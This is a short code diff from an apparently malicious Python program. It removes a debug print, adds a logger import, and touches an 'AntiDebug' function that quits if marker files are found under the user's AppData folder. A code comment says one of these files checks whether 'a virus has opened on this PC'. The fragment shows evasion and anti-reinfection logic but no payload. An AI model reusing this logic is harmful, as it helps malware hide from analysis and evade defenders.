@@ -20,6 +20,7 @@ import requests
 import platform
 import json
 from manager.blacklist import BlackList
+from manager.logger import Log
 
 
 
@@ -149,13 +150,13 @@ def checkPlatform():
 
 
 
-def AntiDebug(oneStart):  
-    print("ad")
+def AntiDebug(oneStart):
     pathf = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
     
     if oneStart:
         if (os.path.exists(rf'{pathf}\system\sysFiles\winDef\log20742384.txt')):# Checks if a virus has opened on this PC
             os._exit(0)
+
     if os.path.exists(rf'{pathf}\windll'):
         os._exit(0)
 
